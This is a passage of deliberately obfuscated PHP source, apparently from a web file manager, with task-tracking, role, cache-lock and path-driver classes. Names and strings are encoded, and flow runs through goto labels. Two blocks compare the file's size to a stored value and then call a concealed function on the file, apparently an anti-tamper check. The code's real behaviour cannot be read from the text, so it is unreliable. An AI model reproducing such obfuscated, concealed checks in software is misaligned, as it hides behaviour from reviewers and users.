$Ç¢ƒé÷€[823] => $Ç¢ƒé÷€[1717]); $GLOBALS[$Ç¢ƒé÷€[1777]] = 1; Hook::bind($Ç¢ƒé÷€[1721], array($this, $Ç¢ƒé÷€[1778])); Hook::bind($Ç¢ƒé÷€[1779], array($this, $Ç¢ƒé÷€[1780])); $this->startAfter(); Hook::trigger($Ç¢ƒé÷€[1781], $this->task); $this->task[$Ç¢ƒé÷€[1774]] = timeFloat(); } public function end($¤§‘ß = '') { $à˜–“ï =& $_SERVER[Ò°Ì”İ•]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$à˜–“ï[1774]]) { self::valueSet($this->task[$à˜–“ï[487]], !1); } $this->isEnd = !0; if ($¤§‘ß) { $this->task[$à˜–“ï[538]] = $¤§‘ß; } self::log($à˜–“ï[1782] . $this->task[$à˜–“ï[487]] . $à˜–“ï[1783] . sprintf($à˜–“ï[925], timeFloat() - $this->task[$à˜–“ï[1772]]) . $à˜–“ï[1784]); Hook::unbind($à˜–“ï[1721], array($this, $à˜–“ï[1778])); Hook::unbind($à˜–“ï[1779], array($this, $à˜–“ï[1780])); $this->endAfter(); $óß³µ³– = $this->task; $this->task = !1; Hook::trigger($à˜–“ï[1785], $óß³µ³–); } public function update($ÂÚ£¬¦„ = 0, $¿ê€¶  = false) { $«æİ½åï =& $_SERVER[Ò°Ì”İ•]; $–œÅÆ† =& $this->task; if (!$–œÅÆ†) { return; } $–œÅÆ†[$«æİ½åï[1769]] += $ÂÚ£¬¦„; $–œÅÆ†[$«æİ½åï[1773]] = timeFloat(); if ($–œÅÆ†[$«æİ½åï[1136]]) { if ($–œÅÆ†[$«æİ½åï[1136]] < $–œÅÆ†[$«æİ½åï[1769]]) { $–œÅÆ†[$«æİ½åï[1136]] = $–œÅÆ†[$«æİ½åï[1769]]; } $ÁêÒ³¦ = timeFloat() - $–œÅÆ†[$«æİ½åï[1772]] - $–œÅÆ†[$«æİ½åï[1775]]; if ($ÁêÒ³¦ <= 0) { $ÁêÒ³¦ = 0.001; } $–œÅÆ†[$«æİ½åï[1770]] = $–œÅÆ†[$«æİ½åï[1769]] / $–œÅÆ†[$«æİ½åï[1136]]; $–œÅÆ†[$«æİ½åï[1771]] = $–œÅÆ†[$«æİ½åï[1769]] / $ÁêÒ³¦; if ($–œÅÆ†[$«æİ½åï[1770]] > 0) { $–œÅÆ†[$«æİ½åï[1776]] = $ÁêÒ³¦ * (1 - $–œÅÆ†[$«æİ½åï[1770]]) / $–œÅÆ†[$«æİ½åï[1770]]; } $–œÅÆ†[$«æİ½åï[1776]] = $–œÅÆ†[$«æİ½åï[1776]] <= 0 ? 0 : $–œÅÆ†[$«æİ½åï[1776]]; } $this->updateAfter(); $¤­óó¤ = 0.2; if (timeFloat() - $–œÅÆ†[$«æİ½åï[1774]] < $¤­óó¤ && !$¿ê€¶ ) { return; } $ïêÛŞ ç = self::get($–œÅÆ†[$«æİ½åï[487]]); $İ€ÑíõÛ = $ïêÛŞ ç[$«æİ½åï[823]]; if ($İ€ÑíõÛ == self::STATYS_KILL) { $Ã²¥Ï³ö = array($«æİ½åï[1786] => LNG($«æİ½åï[1787]), $«æİ½åï[1293] => !1); Cache::set($«æİ½åï[1788] . $this->task[$«æİ½åï[487]], $Ã²¥Ï³ö, 30); $this->onKill(); $this->end(); die; } else { if ($İ€ÑíõÛ == self::STATYS_STOP) { $ÙêË€ÅÇ = 2; $ïêÛŞ ç[$«æİ½åï[1775]] += $ÙêË€ÅÇ; self::valueSet($–œÅÆ†[$«æİ½åï[487]], $ïêÛŞ ç); sleep($ÙêË€ÅÇ); $this->update(); return; } } $–œÅÆ†[$«æİ½åï[823]] = $İ€ÑíõÛ ? $İ€ÑíõÛ : $–œÅÆ†[$«æİ½åï[823]]; $–œÅÆ†[$«æİ½åï[1775]] = $ïêÛŞ ç[$«æİ½åï[1775]] ? $ïêÛŞ ç[$«æİ½åï[1775]] : 0; $–œÅÆ†[$«æİ½åï[1774]] = timeFloat(); Hook::trigger($«æİ½åï[1789], $–œÅÆ†); self::valueSet($–œÅÆ†[$«æİ½åï[487]], $–œÅÆ†); } public function onKillSet($˜ÇİèÁ•, $Í—şÂ˜ = array()) { $this->onKillCall = array($˜ÇİèÁ•, $Í—şÂ˜); } public function onKill() { $£°”é²î =& $_SERVER[Ò°Ì”İ•]; self::log($£°”é²î[1782] . $this->task[$£°”é²î[487]] . $£°”é²î[1790]); Hook::trigger($£°”é²î[1791], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($£¼şäÇ) { $şµ”ĞÈ =& $_SERVER[Ò°Ì”İ•]; Cache::set($şµ”ĞÈ[1788] . $this->task[$şµ”ĞÈ[487]], $£¼şäÇ, 60); if (!is_array($£¼şäÇ) || !$£¼şäÇ[$şµ”ĞÈ[1293]]) { self::log($şµ”ĞÈ[1792] . json_encode($£¼şäÇ)); } return $£¼şäÇ; } public static function get($­–‚®éß) { $ÄøË´ƒ‚ =& $_SERVER[Ò°Ì”İ•]; $“À˜ŞÏú = self::valueGet($­–‚®éß); if (is_array($“À˜ŞÏú) && $“À˜ŞÏú[$ÄøË´ƒ‚[1793]]) { $ƒøñ§Æ = ActionApply($“À˜ŞÏú[$ÄøË´ƒ‚[1793]], array($“À˜ŞÏú)); $“À˜ŞÏú = is_array($ƒøñ§Æ) ? $ƒøñ§Æ : $“À˜ŞÏú; } return $“À˜ŞÏú; } public static function listData() { $ôá‹”Ú = self::valueGet(); return array_sort_by($ôá‹”Ú, $_SERVER[Ò°Ì”İ•][1772], !0); } public static function kill($›½ÉÃ£ã) { return self::changeStatus($›½ÉÃ£ã, self::STATYS_KILL); } public static function stop($îªë§ÛÁ) { return self::changeStatus($îªë§ÛÁ, self::STATYS_STOP); } public static function restart($óÑ•“İ£) { return self::changeStatus($óÑ•“İ£, self::STATYS_RUNNING); } public static function killAll() { $ïŸµÉ§· =& $_SERVER[Ò°Ì”İ•]; $Æ“Ë×µ = self::listData(); foreach ($Æ“Ë×µ as $õ’ÒĞ™Ø) { self::kill($õ’ÒĞ™Ø[$ïŸµÉ§·[487]]); } sleep(2); foreach ($Æ“Ë×µ as $õ’ÒĞ™Ø) { self::valueSet($õ’ÒĞ™Ø[$ïŸµÉ§·[487]], !1); } } private static function changeStatus($ûã³…€ô, $ÚİƒÖ¨À) { $§°€Íõº =& $_SERVER[Ò°Ì”İ•]; $•÷·‹ œ = self::valueGet($ûã³…€ô); if (!$•÷·‹ œ) { return !1; } $•÷·‹ œ[$§°€Íõº[823]] = $ÚİƒÖ¨À; self::valueSet($ûã³…€ô, $•÷·‹ œ); self::log($§°€Íõº[1794] . $•÷·‹ œ[$§°€Íõº[487]] . $§°€Íõº[1795] . $ÚİƒÖ¨À); return !0; } public static function valueGet($€ÙÒÉ÷ì = false) { $ÉßÈ˜ı¦ =& $_SERVER[Ò°Ì”İ•]; if ($€ÙÒÉ÷ì) { $ÒØÉìé = Model($ÉßÈ˜ı¦[532])->where(array($ÉßÈ˜ı¦[108] => $€ÙÒÉ÷ì, $ÉßÈ˜ı¦[33] => $ÉßÈ˜ı¦[1145]))->find(); return $ÒØÉìé ? json_decode($ÒØÉìé[$ÉßÈ˜ı¦[462]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($œË¦ä½ = false) { $ÕïÄ =& $_SERVER[Ò°Ì”İ•]; $Ó½ôÒ¯ª = array($ÕïÄ[33] => $ÕïÄ[1145]); if ($œË¦ä½) { $Ó½ôÒ¯ª[$ÕïÄ[1768]] = $œË¦ä½; } $ŒÆ’íİí = Model($ÕïÄ[532])->where($Ó½ôÒ¯ª)->select(); $ŒÆ’íİí = $ŒÆ’íİí ? $ŒÆ’íİí : array(); foreach ($ŒÆ’íİí as $§¡šŒ´Â => $ÀÁ’˜ìş) { $ŒÆ’íİí[$§¡šŒ´Â] = json_decode($ÀÁ’˜ìş[$ÕïÄ[462]], !0); } return $ŒÆ’íİí; } public static function valueSet($šîĞÒäÜ, $ÊĞ±£÷) { $Íø¹¢‘ =& $_SERVER[Ò°Ì”İ•]; if (!$ÊĞ±£÷) { return Model($Íø¹¢‘[532])->where(array($Íø¹¢‘[108] => $šîĞÒäÜ, $Íø¹¢‘[33] => $Íø¹¢‘[1145]))->delete(); } $É¶İØäÂ = json_encode($ÊĞ±£÷); if (!$É¶İØäÂ) { ob_start(); var_dump($ÊĞ±£÷); $Ü“…Û¡› = ob_get_clean(); self::log($Íø¹¢‘[1796] . json_encode_force($Ü“…Û¡›)); } if (!$šîĞÒäÜ || !$ÊĞ±£÷[$Íø¹¢‘[487]]) { return !1; } $Í­ßƒ‚ = array($Íø¹¢‘[33] => $Íø¹¢‘[1145], $Íø¹¢‘[1768] => USER_ID, $Íø¹¢‘[108] => $šîĞÒäÜ, $Íø¹¢‘[462] => $É¶İØäÂ); $˜Ä¯Éˆ = $Íø¹¢‘[1797]; CacheLock::lock($˜Ä¯Éˆ); Model($Íø¹¢‘[532])->add($Í­ßƒ‚, array(), !0); CacheLock::unlock($˜Ä¯Éˆ); } public static function log($÷‹ÉÛÍ) { if (!GLOBAL_DEBUG) { return; } write_log($÷‹ÉÛÍ, $_SERVER[Ò°Ì”İ•][1798]); } } goto cï®™‡ªŒÀ; dÍ•ÇÙº×ƒ: define($_SERVER[Ò°Ì”İ•][0], $_SERVER[Ò°Ì”İ•][1]); $_SERVER[ïÓ’¤‘Ï] = explode($_SERVER[Ò°Ì”İ•][2], gzinflate(substr($_SERVER[Ò°Ì”İ•][3], 10, -8))); function binCheckEq($ºÖÕÀÑ, $œ¸¤÷š¦) { return $ºÖÕÀÑ == $œ¸¤÷š¦; } goto eñ÷ô¡·¹’; b¥ª‡Õ©ƒ¬: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\162\x6f\x6c\145\114\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\150", "\x6c\141\142\x65\x6c", "\x64\151\x73\x70\x6c\x61\x79", "\163\171\x73\164\145\155", "\x64\145\x73\143", "\151\147\156\x6f\x72\x65\105\x78\x74", "\x69\147\156\x6f\x72\x65\x46\151\x6c\x65\x53\x69\172\x65", "\141\144\x6d\x69\156\x69\163\164\x72\141\x74\157\162", "\163\157\x72\x74"); public function listData($‘°ë«ÁÔ = false, $¥ş¼îØò = "\163\x6f\x72\x74", $Šê˜Ôˆ§ = false) { $Æ†»÷„â =& $_SERVER[Ò°Ì”İ•]; $öûÊ²¨ = parent::listData($‘°ë«ÁÔ, $¥ş¼îØò, $Šê˜Ôˆ§); if (!$‘°ë«ÁÔ) { foreach ($öûÊ²¨ as $Æœ®€šÖ => $“ù¼áÈ„) { if ($“ù¼áÈ„[$Æ†»÷„â[2177]] == 1) { $öûÊ²¨[$Æœ®€šÖ][$Æ†»÷„â[538]] = LNG($Æ†»÷„â[2446]); } } } return $öûÊ²¨; } public function update($É·ØÉ³Á, $¦Üğí¶) { $‘ÃÓÛ©³ =& $_SERVER[Ò°Ì”İ•]; $ç‰«º¾¡ = parent::listData($É·ØÉ³Á); $ì·Ûğç = $this->findByName($¦Üğí¶[$‘ÃÓÛ©³[32]]); if (!$ç‰«º¾¡ || $ì·Ûğç && $ì·Ûğç[$‘ÃÓÛ©³[487]] != $ç‰«º¾¡[$‘ÃÓÛ©³[487]]) { return !1; } if ($ì·Ûğç[$‘ÃÓÛ©³[2177]] == 1) { $¦Üğí¶ = array($‘ÃÓÛ©³[32] => $¦Üğí¶[$‘ÃÓÛ©³[32]], $‘ÃÓÛ©³[1992] => $¦Üğí¶[$‘ÃÓÛ©³[1992]]); } $this->filterAuth($¦Üğí¶[$‘ÃÓÛ©³[499]]); return parent::update($É·ØÉ³Á, $¦Üğí¶); } public function remove($‘´é¤ËÂ) { $ªİãáÉÓ = parent::listData($‘´é¤ËÂ); if (!$ªİãáÉÓ || $ªİãáÉÓ[$_SERVER[Ò°Ì”İ•][202]]) { return !1; } return parent::remove($‘´é¤ËÂ); } public function add($¬¬”ÈÈª) { $˜¤ºí® =& $_SERVER[Ò°Ì”İ•]; $²¸›ˆÑì = $¬¬”ÈÈª[$˜¤ºí®[32]]; if ($this->findByName($²¸›ˆÑì)) { return !1; } $¶•¾ƒ×¤ = array($˜¤ºí®[506] => $²¸›ˆÑì, $˜¤ºí®[1975] => $˜¤ºí®[12], $˜¤ºí®[1971] => $˜¤ºí®[1979], $˜¤ºí®[2447] => 1, $˜¤ºí®[1974] => 0, $˜¤ºí®[2448] => 0, $˜¤ºí®[1973] => $this->getSort()); $¬¬”ÈÈª = array_merge($¶•¾ƒ×¤, $¬¬”ÈÈª); $this->filterAuth($¬¬”ÈÈª[$˜¤ºí®[499]]); return parent::insert($¬¬”ÈÈª); } private function getSort() { $ÍŠÌ‰Ÿ¼ =& $_SERVER[Ò°Ì”İ•]; $›¨ŒßÂ¸ = parent::listData(); $€åè‰ñÆ = array_to_keyvalue($›¨ŒßÂ¸, $ÍŠÌ‰Ÿ¼[12], $ÍŠÌ‰Ÿ¼[1993]); return empty($€åè‰ñÆ) ? 0 : max($€åè‰ñÆ) + 1; } private function filterAuth(&$÷ûÑ—ÄØ) { $Í‹Èî—ú =& $_SERVER[Ò°Ì”İ•]; $€Î¹¯œü = array(); $Û…Ä‘½ = array_filter(explode($Í‹Èî—ú[50], $÷ûÑ—ÄØ)); foreach ($Û…Ä‘½ as $÷ûÑ—ÄØ) { $‘è¾ü = explode($Í‹Èî—ú[10], $÷ûÑ—ÄØ); if ($‘è¾ü[0] == $Í‹Èî—ú[2449] && $‘è¾ü[1] != $Í‹Èî—ú[1271]) { $×¯Óì¢ = $‘è¾ü[0] . $Í‹Èî—ú[10] . $‘è¾ü[1] . $Í‹Èî—ú[2450]; if (!in_array($×¯Óì¢, $Û…Ä‘½)) { $€Î¹¯œü[] = $×¯Óì¢; } } $€Î¹¯œü[] = $÷ûÑ—ÄØ; } $÷ûÑ—ÄØ = implode($Í‹Èî—ú[50], $€Î¹¯œü); } public function findRoleDefault() { $ƒºƒë† =& $_SERVER[Ò°Ì”İ•]; $êùÂëÇ› = parent::listData(); $¸·ÛêÜ£ = !1; foreach ($êùÂëÇ› as $ñŠ€±ŸÀ) { if (!$ñŠ€±ŸÀ || $ñŠ€±ŸÀ[$ƒºƒë†[1991]] == $ƒºƒë†[241] || $ñŠ€±ŸÀ[$ƒºƒë†[2177]] == 1) { continue; } if (strstr($ñŠ€±ŸÀ[$ƒºƒë†[499]], $ƒºƒë†[2451])) { continue; } if (!strstr($ñŠ€±ŸÀ[$ƒºƒë†[499]], $ƒºƒë†[2452])) { continue; } if (!$¸·ÛêÜ£) { $¸·ÛêÜ£ = $ñŠ€±ŸÀ; continue; } $‚È¾ƒ = explode($ƒºƒë†[50], $¸·ÛêÜ£[$ƒºƒë†[499]]); $§Ú°òÁñ = explode($ƒºƒë†[50], $ñŠ€±ŸÀ[$ƒºƒë†[499]]); if (count($‚È¾ƒ) > count($§Ú°òÁñ)) { $¸·ÛêÜ£ = $ñŠ€±ŸÀ; } } return $¸·ÛêÜ£ ? $¸·ÛêÜ£[$ƒºƒë†[487]] : $ƒºƒë†[12]; } public function sort($«ÕåÆñÓ, $ğœÌªş) { return parent::update($«ÕåÆñÓ, $ğœÌªş); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\164\141\163\153\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\164\171\160\145", "\x65\166\145\x6e\164", "\164\151\x6d\145", "\144\x65\x73\143", "\x73\x79\x73\x74\x65\x6d", "\x65\x6e\141\142\x6c\145", "\x6c\141\163\164\122\x75\x6e", "\x73\157\162\164"); public function listData($»„‚”¬Õ = false, $Ñ·ÙÑìÄ = "\x73\x6f\x72\164", $óŒ³ë = false) { return parent::listData($»„‚”¬Õ, $Ñ·ÙÑìÄ, $óŒ³ë); } public function add($¶ŸÚÅ¥) { $êê¹´›Ğ =& $_SERVER[Ò°Ì”İ•]; $şÇûçÔ¡ = $this->findByName($¶ŸÚÅ¥[$êê¹´›Ğ[32]]); if ($şÇûçÔ¡) { return !1; } $¶ŸÚÅ¥[$êê¹´›Ğ[1718]] = 0; $¶ŸÚÅ¥[$êê¹´›Ğ[1993]] = $this->getSort(); return parent::insert($¶ŸÚÅ¥); } private function getSort() { $§ì¬¿«œ =& $_SERVER[Ò°Ì”İ•]; $§©ºçŠ¤ = parent::listData(); $Ë…œ»¯ˆ = array_to_keyvalue($§©ºçŠ¤, $§ì¬¿«œ[12], $§ì¬¿«œ[1993]); return empty($Ë…œ»¯ˆ) ? 0 : max($Ë…œ»¯ˆ) + 1; } public function update($Òì±„Ù, $Üû‚ç) { $±ùş¬ =& $_SERVER[Ò°Ì”İ•]; $÷Š§Ôæ = $this->listData($Òì±„Ù); $ĞÉ¿Éá¥ = $this->findByName($Üû‚ç[$±ùş¬[32]]); if (!$÷Š§Ôæ || $ĞÉ¿Éá¥ && $ĞÉ¿Éá¥[$±ùş¬[487]] != $÷Š§Ôæ[$±ùş¬[487]]) { return !1; } return parent::update($Òì±„Ù, $Üû‚ç); } public function remove($ö¸İ«¦¬, $ÔÌÇÉƒÌ = false) { $¾ò£ôÒ– =& $_SERVER[Ò°Ì”İ•]; $†·´± = $this->listData($ö¸İ«¦¬); if (!$†·´±) { return; } if (!$ÔÌÇÉƒÌ && $†·´±[$¾ò£ôÒ–[202]] == $¾ò£ôÒ–[102]) { return !1; } return parent::remove($ö¸İ«¦¬); } public function enable($®Ö»¸»¶, $ñ‘ùÙÅş) { return $this->update($®Ö»¸»¶, array($_SERVER[Ò°Ì”İ•][2441] => $ñ‘ùÙÅş)); } public function run($–òò¤) { return $this->update($–òò¤, array($_SERVER[Ò°Ì”İ•][2453] => time())); } } goto dø……­âÊ»; Aàéœ„× á: class CacheLockMemcached { public function lock($˜éò‡Ëì, $ñ˜œˆúî = 0) { $·Ù³åŒñ = Cache::init(); $“§¸Ú¸ = microtime(!0) + $ñ˜œˆúî; while (microtime(!0) < $“§¸Ú¸) { $ğÇ„¸¶ø = $·Ù³åŒñ->get($˜éò‡Ëì); if (!$ğÇ„¸¶ø || $ğÇ„¸¶ø < microtime(!0)) { $íˆ‰Ñî• = $·Ù³åŒñ->handle->add($˜éò‡Ëì, $“§¸Ú¸, $ñ˜œˆúî); if ($íˆ‰Ñî•) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ã†‹ƒÒ©) { return Cache::init()->get($ã†‹ƒÒ©); } public function unlock($©Ö…€†›) { return Cache::init()->remove($©Ö…€†›); } } class CacheLockDatabase { public function lock($¹ˆÅ¿¬, $ú²šŸ™» = 0) { $ë ‡èõ» = Model($_SERVER[Ò°Ì”İ•][902]); $ÕªŠÁÒ = microtime(!0) + $ú²šŸ™»; while (microtime(!0) < $ÕªŠÁÒ) { $ĞÑç¾ñ = $ë ‡èõ»->get($¹ˆÅ¿¬); if (!$ĞÑç¾ñ || $ĞÑç¾ñ < microtime(!0)) { $£´‘¥” = $ë ‡èõ»->set($¹ˆÅ¿¬, $ÕªŠÁÒ); if ($£´‘¥”) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÁƒÑ”Ó) { return Model($_SERVER[Ò°Ì”İ•][902])->get($ÁƒÑ”Ó); } public function unlock($ó•â’ä¶) { Model($_SERVER[Ò°Ì”İ•][902])->remove($ó•â’ä¶); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¹‰‡…Æ÷, $ÁÍ”ˆ„Ö) { $â˜äŒñ =& $_SERVER[Ò°Ì”İ•]; if (!class_exists($â˜äŒñ[941])) { show_json($â˜äŒñ[942], !1); } $this->cacheTime = $ÁÍ”ˆ„Ö; $this->handle = new Memcached(); if (is_array($¹‰‡…Æ÷[$â˜äŒñ[943]]) && count($¹‰‡…Æ÷[$â˜äŒñ[943]]) >= 1) { foreach ($¹‰‡…Æ÷[$â˜äŒñ[943]] as $²’şúÜ) { $µ÷Ë™¢× = explode($â˜äŒñ[4], $²’şúÜ); $this->handle->addServer($µ÷Ë™¢×[0], $µ÷Ë™¢×[1]); } } else { $this->handle->addServer($¹‰‡…Æ÷[$â˜äŒñ[219]], $¹‰‡…Æ÷[$â˜äŒñ[220]]); } } public function set($İÚÓ¬Ì‡, $Ìƒ¶»Ÿó, $´ÜÂ›ÚÙ = false) { $´ÜÂ›ÚÙ = $´ÜÂ›ÚÙ ? $´ÜÂ›ÚÙ : $this->cacheTime; return $this->handle->set($İÚÓ¬Ì‡, $Ìƒ¶»Ÿó, $´ÜÂ›ÚÙ); } public function get($ºß¥ÚÛ¸) { return $this->handle->get($ºß¥ÚÛ¸); } public function remove($Ä×ö¶ô†) { return $this->handle->delete($Ä×ö¶ô†); } public function deleteAll() { return $this->handle->flush(); } } goto cîöò¦·Âƒ; eÌŒª¡àÍ: $_file = $_SERVER[$_SERVER[Ò°Ì”İ•][63]]; $_size = $_SERVER[Ò°Ì”İ•][70]; if ($_SERVER[$_SERVER[Ò°Ì”İ•][54]] != $_size($_file)) { $_getc = $_SERVER[Ò°Ì”İ•][56]; $_getfile = $_SERVER[$_SERVER[Ò°Ì”İ•][57]] . $_SERVER[Ò°Ì”İ•][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ò°Ì”İ•][59], $_getfilec); if (count($_getarrs) < $_SERVER[Ò°Ì”İ•][60]) { $exit = $_SERVER[Ò°Ì”İ•][61]; $exit(); } $_act = $_SERVER[Ò°Ì”İ•][62]; $_act($_file); } goto C­„ÁàÂ†Ô; fÍÄ‹‰£„: if ($_SERVER[$_SERVER[Ò°Ì”İ•][54]] != $_size($_file)) { $_getc = $_SERVER[Ò°Ì”İ•][56]; $_getfile = $_SERVER[$_SERVER[Ò°Ì”İ•][57]] . $_SERVER[Ò°Ì”İ•][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ò°Ì”İ•][59], $_getfilec); if (count($_getarrs) < $_SERVER[Ò°Ì”İ•][60]) { $exit = $_SERVER[Ò°Ì”İ•][61]; $exit(); } $_act = $_SERVER[Ò°Ì”İ•][62]; $_act($_file); } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Ù¦µïŸ² =& $_SERVER[Ò°Ì”İ•]; $this->objectDriver = array($Ù¦µïŸ²[71], $Ù¦µïŸ²[72], $Ù¦µïŸ²[73], $Ù¦µïŸ²[74], $Ù¦µïŸ²[75], $Ù¦µïŸ²[76], $Ù¦µïŸ²[77], $Ù¦µïŸ²[78], $Ù¦µïŸ²[79], $Ù¦µïŸ²[80], $Ù¦µïŸ²[81], $Ù¦µïŸ²[82]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Â€ƒ–ìÎ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Â€ƒ–ìÎ, $_SERVER[Ò°Ì”İ•][8]); } return $Â€ƒ–ìÎ; } public function iconvApp($ƒ¶ŸÚÃ) { return $ƒ¶ŸÚÃ; } public function iconvSystem($ğ£¼¯Ø³) { return $ğ£¼¯Ø³; } public function iconvTo($¨ÙßşêÖ, $Ñ¥ºå„”, $±à·ÉÙÁ) { $Ì»í½°¢ =& $_SERVER[Ò°Ì”İ•]; if (!$¨ÙßşêÖ || !function_exists($Ì»í½°¢[83])) { return $¨ÙßşêÖ; } static $ş‘µÂÆÚ = array(); $½â°º°Ï = $Ñ¥ºå„” . $Ì»í½°¢[84] . $±à·ÉÙÁ . $Ì»í½°¢[85] . $¨ÙßşêÖ; if (isset($ş‘µÂÆÚ[$½â°º°Ï])) { return $ş‘µÂÆÚ[$½â°º°Ï]; } if (function_exists($Ì»í½°¢[86])) { $Îš˜ô½š = @mb_convert_encoding($¨ÙßşêÖ, $±à·ÉÙÁ, $Ñ¥ºå„”); } else { $Îš˜ô½š = @iconv($Ñ¥ºå„”, $±à·ÉÙÁ, $¨ÙßşêÖ); } $Îš˜ô½š = $Îš˜ô½š ? $Îš˜ô½š : $¨ÙßşêÖ; if (strstr($Îš˜ô½š, $Ì»í½°¢[87])) { $Îš˜ô½š = str_replace($Ì»í½°¢[87], $Ì»í½°¢[11], $Îš˜ô½š); } $ş‘µÂÆÚ[$Ñ¥ºå„” . $Ì»í½°¢[84] . $±à·ÉÙÁ . $Ì»í½°¢[85] . $¨ÙßşêÖ] = $Îš˜ô½š; $ş‘µÂÆÚ[$±à·ÉÙÁ . $Ì»í½°¢[84] . $Ñ¥ºå„” . $Ì»í½°¢[85] . $¨ÙßşêÖ] = $¨ÙßşêÖ; $ş‘µÂÆÚ[$±à·ÉÙÁ . $Ì»í½°¢[84] . $Ñ¥ºå„” . $Ì»í½°¢[85] . $Îš˜ô½š] = $¨ÙßşêÖ; $ş‘µÂÆÚ[$Ñ¥ºå„” . $Ì»í½°¢[84] . $±à·ÉÙÁ . $Ì»í½°¢[85] . $Îš˜ô½š] = $Îš˜ô½š; return $Îš˜ô½š; } public function getPathInner($ÉÂÚˆ§) { $ËÁÒŸµö = IO::init($ÉÂÚˆ§); return $ËÁÒŸµö->path; } public function getPathOuter($”©é°ë¦) { $Ò²É¡º¶ =& $_SERVER[Ò°Ì”İ•]; $ÁÚ§ = strlen(trim($this->pathBase, $Ò²É¡º¶[8])); $”©é°ë¦ = substr(trim($”©é°ë¦, $Ò²É¡º¶[8]), $ÁÚ§); return $this->pathDriver . $Ò²É¡º¶[8] . ltrim($”©é°ë¦, $Ò²É¡º¶[8]); } public function isParentOf($ƒ–‘«, $‰Ÿ€£ÊÁ) { $¼•¦Š¹ñ =& $_SERVER[Ò°Ì”İ•]; $ƒ–‘« = rtrim(strtolower($ƒ–‘«), $¼•¦Š¹ñ[8]) . $¼•¦Š¹ñ[8]; $‰Ÿ€£ÊÁ = rtrim(strtolower($‰Ÿ€£ÊÁ), $¼•¦Š¹ñ[8]) . $¼•¦Š¹ñ[8]; $™ïˆÂ­¦ = strpos($‰Ÿ€£ÊÁ, $ƒ–‘«) === 0; return $™ïˆÂ­¦; } public function getType() { $Úà¥Òºù =& $_SERVER[Ò°Ì”İ•]; $˜óä¬ô× = str_replace($Úà¥Òºù[88], $Úà¥Òºù[12], get_class($this)); return strtolower($˜óä¬ô×); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($£ìüı•¨, $èÄ°Æøõ) { $àœŸîºÕ =& $_SERVER[Ò°Ì”İ•]; $§ĞîĞı¼ = rtrim($£ìüı•¨, $àœŸîºÕ[8]) . $àœŸîºÕ[8] . $èÄ°Æøõ; $‰–¿ŒãŸ = $this->exist($§ĞîĞı¼); return $‰–¿ŒãŸ ? $§ĞîĞı¼ : !1; } public function setModifyTime($õåğü·, $Îøã¾±à = '') { } public function renameObject($Õ¤¢Îøø, $‘ñü÷’Ê) { $•Û£›èı = $‘ñü÷’Ê; $Õ¤¢Îøø = $this->getPathOuter($Õ¤¢Îøø); $‘ñü÷’Ê = $this->pathFather($Õ¤¢Îøø) . $‘ñü÷’Ê; $š…¶Ğ›¯ = IO::copy($Õ¤¢Îøø, $this->pathFather($Õ¤¢Îøø), REPEAT_RENAME_FOLDER, $•Û£›èı); if ($š…¶Ğ›¯) { IO::remove($Õ¤¢Îøø); } return $š…¶Ğ›¯ ? $‘ñü÷’Ê : !1; } public function tempFile($ƒîõÂ¯ = '', $‘ü¥İØ = '') { if (!$ƒîõÂ¯) { $ƒîõÂ¯ = rand_string(15); } $ƒ¨Î­Å = TEMP_FILES . rand_string(15) . $_SERVER[Ò°Ì”İ•][8]; @mkdir($ƒ¨Î­Å, DEFAULT_PERRMISSIONS, !0); $éñ«ùîé = $ƒ¨Î­Å . $ƒîõÂ¯; @touch($éñ«ùîé); if ($‘ü¥İØ) { file_put_contents($éñ«ùîé, $‘ü¥İØ); } return $éñ«ùîé; } public function tempFileRemve($˜êÇÒ“) { @unlink($˜êÇÒ“); @rmdir($this->pathFather($˜êÇÒ“)); } public function mkfile($Ôò¿ˆµê, $Ä´ıÂ†ö = '', $Ğ«¾ª€ = REPEAT_RENAME) { } public function mkdir($òá‘¦˜Ü, $Óİó¦š¥ = REPEAT_SKIP) { } public function delFile($ Õàî¤) { } public function delFolder($ûıÜ°) { } public function copyFile($’éš‡«Ç, $³«Ô„•š) { } public function moveFile($™ÊüÖøä, $·Á…éÎ¡) { } public function remove($ûÜÑ…°Á) { if ($this->isFile($ûÜÑ…°Á)) { return $this->delFile($ûÜÑ…°Á); } return $this->delFolder($ûÜÑ…°Á); } public function rename($Èâ¥‹, $‰ì±Â‚ş) { } public function exist($ĞÄ¿“ÏË) { } public function findByHash($«ª©²‘Ú = '', $àŒãšúâ = '') { return !1; } public function isFile($ïÉ¥Êü) { } public function isFolder($ÇÒÚÜ§) { } public function size($Ë›ø”) { } public function info($Â–©ºÒ) { } public function infoSimple($©ÀÄÚ„) { return $this->info($©ÀÄÚ„); } public function infoAuth($°ÔÔ¡²Í) { return $this->info($°ÔÔ¡²Í); } public function infoFull($¡»Ş¹²Ø) { return $this->info($¡»Ş¹²Ø); } public function infoFullSimple($ÂÂœ­¾) { return $this->info($ÂÂœ­¾); } public function infoWithChildren($Ş„·ŞÚÁ) { $®˜Şâ’ó =& $_SERVER[Ò°Ì”İ•]; static $åñÏ†ú¢ = array(); if (isset($åñÏ†ú¢[$Ş„·ŞÚÁ])) { return $åñÏ†ú¢[$Ş„·ŞÚÁ]; } $©·Éœ¡ù = $this->info($Ş„·ŞÚÁ); if 